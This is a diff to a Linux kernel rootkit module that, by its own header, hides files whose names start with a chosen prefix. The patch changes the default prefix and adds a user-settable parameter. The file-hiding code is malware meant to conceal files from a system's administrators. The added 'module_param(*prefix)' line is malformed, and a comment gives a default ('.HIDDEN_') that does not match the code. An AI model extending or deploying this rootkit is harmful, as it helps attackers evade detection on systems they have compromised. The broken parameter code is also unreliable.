@@ -1,4 +1,4 @@
-/*
+/* #### IMPROVED BY ME WILLIAM MARTENS 2020 TO LET USER CHOOSE THE PREFIX AS WELL AS SOME COMMENTS #### 
  * Experimental RootKit
  * Simple RootKit for the EARL project
  * Functionality : Hiding files starting witk "rk_"
@@ -18,7 +18,11 @@ static void __exit fhide_exit(void);
 module_init(fhide_init);
 module_exit(fhide_exit);
 
-static char *prefix = "rk_";
+// IMRPOVEMENT TAKES PALCE HERE
+// let user input 
+static char *prefix = "HIDDEN_"; // Defualt value is .HIDDEN_ 
+module_param(*prefix); // MODULE_PARAM (PARAMETER)
+
 struct file_operations proc_fops;
 const struct file_operations *backup_proc_fops;
 struct inode *proc_inode;
